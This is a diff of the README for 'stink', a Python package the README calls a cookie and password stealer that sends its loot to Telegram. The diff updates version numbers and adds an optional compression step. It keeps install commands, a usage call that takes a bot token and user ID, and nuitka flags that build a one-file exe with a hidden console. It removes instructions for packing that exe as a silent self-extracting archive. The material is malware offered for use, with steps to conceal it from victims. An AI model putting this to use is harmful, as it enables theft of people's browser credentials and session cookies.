@@ -25,9 +25,6 @@ Cookies and passwords stealer in just 2 lines. Sending to Telegram.
   * [Creating executable file](#Creating-executable-file)
   * [With BAT](#With-BAT)
   * [With CMD](#With-CMD)
-* [Сompression exe](#Сompression-exe)
-  * [Disadvantages](#Disadvantages)
-  * [WinRAR](#WinRAR)
 
 ### Current features
 1. Support for the following browsers:
@@ -57,7 +54,7 @@ Cookies and passwords stealer in just 2 lines. Sending to Telegram.
 
 You can install the latest version with the command:
 ```
-pip install stink==1.2.1
+pip install stink==1.2.2
 ```
 
 ## Example usage
@@ -144,7 +141,7 @@ Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
 
 #### With BAT
-1. Download [compiler](https://github.com/FallenAstaroth/stink/releases/download/v1.2.1/compiler.bat).
+1. Download [compiler](https://github.com/FallenAstaroth/stink/releases/download/v1.2.2/compiler.bat).
 2. Move it to the same directory as the test.py file.
 3. Run compiler.bat.
 
@@ -170,36 +167,15 @@ venv\Scripts\activate
 pip install Nuitka==0.6.16.4
 ```
 ```
-pip install stink==1.2.1
+pip install stink==1.2.2
 ```
-6. Write the command:
+6. To reduce the file size, additionally install Zstandard (optional):
+```
+pip install zstandard==0.17.0
+```
+7. Write the command:
 ```
 nuitka --onefile --windows-disable-console --include-package=stink test.py
 ```
 
 After executing the command we get the test.exe file with the hidden console.
-
-## Сompression exe
-File `.exe` is too big, so we will compress it with WinRAR, but it will still be in the `.exe` format.
-
-#### Disadvantages
-- Can be detected by various anti-viruses.
-- Longer program startup time.
-
-### WinRAR
-1. Download and install [WinRAR](https://www.win-rar.com/start.html?&L=4)
-2. Right-click `.exe` file and select `Add to archive...`.
-3. Select the `RAR` archive format, `Maximum` compression method, and `32 MB` Dictionary size and click `Create SFX archive`.
-4. Go to the tab `Advanced` and select `SFX options`.
-5. Go to the tab `Install` and enter the name of your file (for example `test.exe`) into the field `Execute after unpacking`.
-6. Go to the tab `Modes` and click `Unpack to Temp folder` and select `Hide all` in the section `Information output mode`.
-7. Go to the tab `Update` and select `Overwrite all files without request` in the section `Overwrite mode`.
-8. Change the icon and logo if you want in the tab `Text and Graphics`.
-9. Press `OK`.
-
-As a result we get `.exe` file reduced several times:
-```
-        File size           Ratio
-------------------------    -----
-40 065 KB  ->  12 776 KB    68.1%
-```
